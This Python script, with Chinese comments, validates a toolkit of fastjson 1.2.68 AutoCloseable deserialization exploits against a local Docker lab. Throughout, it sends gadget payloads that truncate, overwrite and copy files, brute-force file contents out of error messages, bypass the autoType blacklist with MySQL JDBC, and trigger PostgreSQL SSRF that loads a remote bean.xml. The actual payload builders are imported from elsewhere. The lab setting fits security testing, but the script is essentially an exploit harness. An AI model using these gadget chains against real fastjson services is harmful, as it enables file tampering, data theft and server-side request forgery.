"""在 fastjson-1268-lab 上验证 1.2.68 AutoCloseable 各证明 payload。"""

from __future__ import annotations

import json
import subprocess
import sys
import time
from pathlib import Path

import httpx

from fastjson_toolkit.poc.v1_2_68.payloads import (
    build_file_copy,
    build_file_truncate,
    build_file_writer_truncate,
    build_io1_write,
    build_io3_write,
    build_io4_write,
    build_io5_write,
    build_io_final,
    build_io_read_error,
    build_jdk11_write,
    build_mysql_jdbc_51,
    build_postgresql_ssrf,
)

ROOT = Path(__file__).resolve().parents[2]
LAB = ROOT / "lab" / "fastjson-1268-lab"
PROOF = ROOT / "tmp_lab" / "1268_proof"
BASE = "http://127.0.0.1:18268"
CONTAINER = "fastjson-1268-lab"


def wait_health(seconds: int = 180) -> dict:
    deadline = time.time() + seconds
    last = ""
    while time.time() < deadline:
        try:
            with httpx.Client(timeout=3.0, trust_env=False) as c:
                r = c.get(f"{BASE}/api/health")
                if r.status_code == 200:
                    return r.json()
                last = r.text
        except Exception as exc:  # noqa: BLE001
            last = str(exc)
        time.sleep(2)
    raise RuntimeError(f"health timeout: {last}")


def clear_markers() -> None:
    with httpx.Client(timeout=5.0, trust_env=False) as c:
        c.request("DELETE", f"{BASE}/api/markers")


def get_markers() -> dict:
    with httpx.Client(timeout=5.0, trust_env=False) as c:
        return c.get(f"{BASE}/api/markers").json().get("markers", {})


def post_payload(body: str, timeout: float = 25.0) -> tuple[int, str]:
    with httpx.Client(timeout=timeout, trust_env=False) as c:
        r = c.post(
            f"{BASE}/api/fastjson",
            content=body.encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        return r.status_code, r.text[:800]


def ensure_lab() -> dict:
    print("[*] docker compose up --build -d")
    subprocess.run(
        ["docker", "compose", "up", "--build", "-d"],
        cwd=str(LAB),
        check=True,
    )
    info = wait_health()
    print("[*] health", json.dumps(info, ensure_ascii=False))
    deps = info.get("deps") or {}
    for key in ("commons_io", "aspectjtools", "ant", "mysql51", "postgresql", "nashorn_urlreader"):
        if not deps.get(key):
            raise RuntimeError(f"靶场缺少依赖: {key}")
    return info


def marker_exists(key: str) -> bool:
    markers = get_markers()
    # key 可能是完整文件名或前缀
    if key in markers:
        ok = bool(markers[key].get("exists"))
        print(f"    marker {key}: {markers.get(key)}")
        return ok
    for name, meta in markers.items():
        if name == key or name.startswith(key):
            ok = bool(meta.get("exists"))
            print(f"    marker {name}: {meta}")
            return ok
    print(f"    marker {key}: missing; all={list(markers)}")
    return False


def marker_content_contains(key: str, needle: str) -> bool:
    markers = get_markers()
    meta = markers.get(key) or {}
    content = meta.get("content") or ""
    print(f"    marker {key}: {meta}")
    return needle in content


def docker_exec_write(path: str, content: str) -> None:
    subprocess.run(
        [
            "docker",
            "exec",
            CONTAINER,
            "sh",
            "-c",
            f"printf '%s' '{content}' > {path}",
        ],
        check=True,
        capture_output=True,
        text=True,
    )


def main() -> int:
    PROOF.mkdir(parents=True, exist_ok=True)
    ensure_lab()
    clear_markers()

    # 预置截断目标（非空）
    docker_exec_write("/tmp/fj1268_truncate", "OLDDATA")
    docker_exec_write("/tmp/fj1268_writer_truncate", "OLDDATA")

    results: dict[str, str] = {}

    def run_case(name: str, payload: str, check) -> None:
        (PROOF / f"{name}.json").write_text(payload, encoding="utf-8")
        print(f"[*] {name}  payload={len(payload)} bytes")
        # io1 构造器选择有随机性，多试几次
        attempts = 5 if name.startswith("io1") else 1
        ok = False
        last_http = ""
        for i in range(attempts):
            if name.startswith("io") or name in ("jdk11_write", "file_copy", "file_truncate", "file_writer_truncate"):
                # 写链：每次清理目标 marker（保留 copy_src）
                clear_markers()
                if name == "file_truncate":
                    docker_exec_write("/tmp/fj1268_truncate", "OLDDATA")
                if name == "file_writer_truncate":
                    docker_exec_write("/tmp/fj1268_writer_truncate", "OLDDATA")
            code, text = post_payload(payload)
            last_http = f"http={code} {text[:160]}"
            print(f"    try#{i + 1} {last_http}")
            time.sleep(0.4)
            if check(code, text):
                ok = True
                break
        results[name] = "PASS" if ok else "FAIL"
        if not ok:
            print(f"    [!] fail detail: {last_http}")

    # --- 文件截断 ---
    run_case(
        "file_truncate",
        build_file_truncate("/tmp/fj1268_truncate"),
        lambda code, text: marker_exists("fj1268_truncate")
        and get_markers().get("fj1268_truncate", {}).get("size", -1) == 0,
    )
    run_case(
        "file_writer_truncate",
        build_file_writer_truncate("/tmp/fj1268_writer_truncate"),
        lambda code, text: marker_exists("fj1268_writer_truncate")
        and get_markers().get("fj1268_writer_truncate", {}).get("size", -1) == 0,
    )  # OutputStreamWriter+FileOutputStream（JDK11 兼容）

    # --- JDK11 任意写 ---
    run_case(
        "jdk11_write",
        build_jdk11_write("/tmp/fj1268_jdk_write", "FJ1268_JDK_WRITE"),
        lambda code, text: marker_content_contains("fj1268_jdk_write", "FJ1268_JDK_WRITE"),
    )

    # --- 文件复制 ---
    run_case(
        "file_copy",
        build_file_copy("/tmp/fj1268_copy_dst", "/tmp/fj1268_copy_src"),
        lambda code, text: marker_content_contains("fj1268_copy_dst", "FJ1268_COPY_SRC"),
    )

    # --- commons-io 写 ---
    run_case(
        "io1_write",
        build_io1_write("/tmp/fj1268_io1", "FJ1268_IO1"),
        lambda code, text: marker_content_contains("fj1268_io1", "FJ1268_IO1"),
    )
    run_case(
        "io3_write",
        build_io3_write("/tmp/fj1268_io3", "FJ1268_IO3"),
        lambda code, text: marker_content_contains("fj1268_io3", "FJ1268_IO3"),
    )
    run_case(
        "io4_write",
        build_io4_write("/tmp/fj1268_io4", "FJ1268_IO4"),
        lambda code, text: marker_content_contains("fj1268_io4", "FJ1268_IO4"),
    )
    run_case(
        "io5_write",
        build_io5_write("/tmp/fj1268_io5", "FJ1268_IO5"),
        lambda code, text: marker_content_contains("fj1268_io5", "FJ1268_IO5"),
    )
    run_case(
        "io_final",
        build_io_final("/tmp/fj1268_iofinal", "FJ1268_IOFINAL"),
        lambda code, text: marker_content_contains("fj1268_iofinal", "FJ1268_IOFINAL"),
    )

    # --- 报错读：正确首字节 'F'=70 应触发异常特征；错误字节不应 ---
    def check_read_error(code: int, text: str) -> bool:
        # 猜对：通常 400 且含 charSequence / BOM / Type 相关错误
        wrong = build_io_read_error("file:///tmp/fj1268_copy_src", guess_byte=1)
        code_w, text_w = post_payload(wrong)
        print(f"    wrong-byte http={code_w} {text_w[:120]}")
        # 正确字节与错误字节响应应有差异，或正确时出现特定错误
        if code != code_w:
            return True
        markers = ("charSequence", "BOM", "AutoCloseable", "TypeUtils", "create instance")
        hit = any(m.lower() in text.lower() for m in markers)
        miss = any(m.lower() in text_w.lower() for m in markers)
        return hit and not miss or (hit and text != text_w)

    run_case(
        "io_read_error",
        build_io_read_error("file:///tmp/fj1268_copy_src", guess_byte=70),  # 'F'
        check_read_error,
    )

    # --- 报错读全文：爆破读 /tmp/fj1268_copy_src → FJ1268_COPY_SRC\n ---
    from fastjson_toolkit.poc import Poc1268SendOptions, run_poc_1268

    print("[*] io_read_error brute full file")
    brute = run_poc_1268(
        Poc1268SendOptions(
            gadget="io_read_error",
            url="file:///tmp/fj1268_copy_src",
            read_length=32,
            read_charset="mixed",
            target=f"{BASE}/api/fastjson",
            send=True,
            timeout=10.0,
        )
    )
    expected = "FJ1268_COPY_SRC"
    got = brute.read_content or ""
    ok_brute = brute.ok and got.startswith(expected)
    print(f"    summary={brute.summary}")
    print(f"    content={got!r}")
    results["io_read_error_brute"] = "PASS" if ok_brute else "FAIL"
    print("    PASS" if ok_brute else "    FAIL")


    # --- JDBC：证明绕过黑名单并尝试连接（期望连接失败类错误，而非 autoType not support）---
    def check_jdbc(code: int, text: str) -> bool:
        """证明 AutoCloseable 已绕过：类被实例化/构造（非 autoType 黑名单拒绝）。"""
        bad = (
            "autoType is not support",
            "not support autoType",
            "denyList",
            "blackList",
            "not close json text",
        )
        if any(b.lower() in text.lower() for b in bad):
            return False
        good = (
            "CommunicationsException",
            "Communications link failure",
            "Connection",
            "connect",
            "Socket",
            "UnknownHost",
            "JDBC4Connection",
            "PgConnection",
            "ClassPathXml",
            "BeanDefinition",
            "FileNotFound",
            "MalformedURL",
            "Connection refused",
            "refused",
            "Could not connect",
            "socketFactory",
            "create instance error",
            "SQLException",
            "HostSpec",
        )
        return any(g.lower() in text.lower() for g in good)

    run_case(
        "mysql_jdbc",
        build_mysql_jdbc_51("127.0.0.1", 3308, "fj1268"),
        check_jdbc,
    )
    run_case(
        "postgresql_ssrf",
        build_postgresql_ssrf("http://host.docker.internal:18099/bean.xml"),
        check_jdbc,
    )

    print("SUMMARY", json.dumps(results, ensure_ascii=False, indent=2))
    (PROOF / "summary.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    failed = [k for k, v in results.items() if v != "PASS"]
    if failed:
        print("[!] failed:", ", ".join(failed))
        return 1
    print("[+] all gadget proofs passed on fastjson-1268-lab")
    return 0


if __name__ == "__main__":
    sys.exit(main())
